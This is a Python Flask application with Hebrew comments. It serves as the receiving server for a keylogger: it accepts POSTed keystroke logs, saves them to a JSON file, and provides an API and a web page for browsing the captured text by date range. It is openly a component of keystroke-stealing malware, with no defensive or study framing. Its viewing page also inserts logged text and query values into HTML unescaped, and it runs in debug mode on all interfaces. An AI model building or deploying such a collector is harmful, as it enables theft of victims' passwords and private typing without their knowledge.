from my_flask import Flask, request, jsonify, render_template_string
import json
import os
from datetime import datetime

app = Flask(__name__)
LOG_FILE = "logs.json"

# טוען את הלוגים מהקובץ (אם קיים)
def load_logs():
    if not os.path.exists(LOG_FILE):
        return []
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

# שמירת שורת לוג חדשה לקובץ
def save_log_entry(entry):
    logs = load_logs()
    logs.append(entry)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)

# 📥 API: קבלת לוג מה-Keylogger
@app.route('/endpoint', methods=['POST'])
def receive_log():
    data = request.get_json()
    timestamp = data.get('timestamp')
    log = data.get('log')

    if not timestamp or not log:
        return jsonify({"error": "Missing timestamp or log"}), 400

    entry = {
        "timestamp": timestamp,
        "log": log
    }
    save_log_entry(entry)
    return jsonify({"status": "ok"}), 200

# 📤 API: שליפת לוגים לפי טווח תאריכים
@app.route('/logs', methods=['GET'])
def get_logs():
    from_date = request.args.get('from_date')
    to_date = request.args.get('to_date')

    if not from_date or not to_date:
        return jsonify({"error": "Missing from_date or to_date"}), 400

    try:
        from_dt = datetime.fromisoformat(from_date + "T00:00:00")
        to_dt = datetime.fromisoformat(to_date + "T23:59:59")
    except Exception:
        return jsonify({"error": "Invalid date format. Use YYYY-MM-DD"}), 400

    logs = load_logs()
    filtered = [
        log for log in logs
        if from_dt <= datetime.fromisoformat(log["timestamp"]) <= to_dt
    ]
    return jsonify(filtered)

# 🖥️ HTML: טופס להזנת תאריכים וצפייה בלוגים
@app.route('/')
def home():
    return render_template_string('''
        <html>
        <head>
            <title>צפייה בלוגים</title>
        </head>
        <body>
            <h2>חיפוש לוגים לפי תאריכים</h2>
            <form method="get" action="/view">
                מתאריך: <input type="date" name="from_date" required><br><br>
                עד תאריך: <input type="date" name="to_date" required><br><br>
                <input type="submit" value="חפש לוגים">
            </form>
        </body>
        </html>
    ''')

# תצוגת הלוגים בתבנית פשוטה
@app.route('/view')
def view_logs():
    from_date = request.args.get('from_date')
    to_date = request.args.get('to_date')

    try:
        from_dt = datetime.fromisoformat(from_date + "T00:00:00")
        to_dt = datetime.fromisoformat(to_date + "T23:59:59")
    except:
        return "פורמט תאריך לא תקין. השתמש ב-YYYY-MM-DD"

    logs = load_logs()
    filtered = [
        log for log in logs
        if from_dt <= datetime.fromisoformat(log["timestamp"]) <= to_dt
    ]

    html = "<h2>תוצאות חיפוש:</h2>"
    html += f"<p>מתאריך {from_date} עד {to_date}</p><ul>"
    for log in filtered:
        html += f"<li><b>{log['timestamp']}</b>: {log['log']}</li>"
    html += "</ul><br><a href='/'>⬅ חזרה</a>"
    return html

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
